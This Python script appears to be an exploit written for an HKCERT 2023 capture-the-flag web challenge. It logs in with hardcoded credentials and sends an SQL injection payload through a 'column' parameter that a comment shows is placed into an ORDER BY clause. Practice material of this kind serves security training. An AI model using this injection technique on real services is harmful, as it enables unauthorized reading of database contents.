import aiohttp
import asyncio
import json
import base64

# URL = "http://chal-a.hkcert23.pwnable.hk:28107"
URL = "http://localhost:28107"
session: aiohttp.ClientSession

LOGIN = {
    "username": "dtuhax",
    "password": "hkcert"
}


async def login():
    async with session.post(f"{URL}/login", json=LOGIN) as resp:
        if resp.status == 200:
            resp.cookies.update({
                "token": str(base64.b64encode(f"{LOGIN['username']}:{LOGIN['password']}".encode()).decode("utf-8"))
            })
            session.cookie_jar.update_cookies(resp.cookies)
        return resp.status == 200


async def note(note_type, column, ascending):
    params = {
        "noteType": note_type,
        "column": column,
        "ascending": ascending
    }
    # Public: "SELECT username, publicnote FROM users ORDER BY {column} {ascending};"
    async with session.get(f"{URL}/note", params=params) as resp:
        res = await resp.text()
        if resp.status == 200:
            json_res = json.loads(res)
            return json_res
        else:
            print(f"Error {resp.status}")
            return None


async def pwn():
    notes = await note("public", "username ASC AND ", "ASC")
    if notes:
        print(json.dumps(notes, indent=4, sort_keys=True))


async def main():
    global session
    session = aiohttp.ClientSession()

    try:
        success = await login()
        if not success:
            print("Login failed")
            await session.close()
            return
        print("Login success")

        await pwn()
    except Exception as e:
        await session.close()
        raise e
    await session.close()


if __name__ == '__main__':
    asyncio.run(main())
